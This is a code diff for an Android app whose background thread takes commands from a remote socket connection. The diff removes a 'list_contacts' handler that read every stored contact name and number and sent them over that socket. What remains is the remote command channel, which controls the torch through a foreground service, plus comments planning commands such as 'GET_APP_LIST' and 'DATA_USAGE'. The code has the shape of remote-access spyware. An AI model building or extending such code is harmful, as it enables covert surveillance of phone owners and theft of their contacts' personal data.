@@ -1,4 +1,4 @@
-package com.you.app;
+package com.you.myapplication;
 
 import android.Manifest;
 import android.content.Context;
@@ -11,10 +11,12 @@ import android.provider.ContactsContract;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.karumi.dexter.Dexter;
+import com.karumi.dexter.MultiplePermissionsReport;
 import com.karumi.dexter.PermissionToken;
 import com.karumi.dexter.listener.PermissionDeniedResponse;
 import com.karumi.dexter.listener.PermissionGrantedResponse;
 import com.karumi.dexter.listener.PermissionRequest;
+import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
 import com.karumi.dexter.listener.single.PermissionListener;
 
 import java.io.BufferedReader;
@@ -23,6 +25,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -41,18 +44,16 @@ public class MainActivity extends AppCompatActivity {
 
         // Permission check for CAMERA
         Dexter.withContext(this)
-                .withPermission(Manifest.permission.CAMERA)
-                .withListener(new PermissionListener() {
-                    @Override
-                    public void onPermissionGranted(PermissionGrantedResponse response) {
+                .withPermissions(
+                        Manifest.permission.CAMERA
+
+                ).withListener(new MultiplePermissionsListener() {
+                    // Ye tab call hota hai jab user allow ya deny kar de permissions ko. Yaha tum logic likh sakte ho permission milne ke baad — jaise tumhara initCamera() call.
+                    @Override public void onPermissionsChecked(MultiplePermissionsReport report) {
                         initCamera();
                     }
-
-                    @Override
-                    public void onPermissionDenied(PermissionDeniedResponse response) { }
-
-                    @Override
-                    public void onPermissionRationaleShouldBeShown(PermissionRequest permission, PermissionToken token) { }
+                    //Agar user pehle deny kar chuka hai aur Android sochta hai ki "why app needs this permission" — tab ye call hota hai. Tum user ko explain kar sakte ho ki permission kyu chahiye aur phir token.continuePermissionRequest() call kar ke dobara request bhej sakte ho.
+                    @Override public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {/* ... */}
                 }).check();
 
         // Start foreground service
@@ -78,22 +79,6 @@ public class MainActivity extends AppCompatActivity {
         try {
             cameraManager.setTorchMode(cameraId, false);
         } catch (Exception e) { }
-    }
-
-    // Contacts function
-    public String listContacts() {
-        StringBuilder sb = new StringBuilder();
-        Cursor c = getContentResolver().query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                null, null, null, null
-        );
-        while (c != null && c.moveToNext()) {
-            String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-            String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-            sb.append(name).append(" : ").append(number).append("\n");
-        }
-        if (c != null) c.close();
-        return sb.toString();
     }
 
     // Future helper functions can go here
@@ -125,12 +110,7 @@ class AppThread extends Thread {
                     } else if (line.equalsIgnoreCase("FLASH_OFF")) {
                         MainActivity.torchOFF();
                         out.write("[*] Torch OFF\n".getBytes());
-                    } else if (line.equalsIgnoreCase("list_contacts")) {
-                        // Call contacts function from MainActivity
-                        String contacts = MainActivity.instance.listContacts();
-                        out.write(contacts.getBytes());
                     }
-
                     // 🌟 Future commands can be added here
                     // Example: "GET_APP_LIST", "DATA_USAGE", etc.
                 }
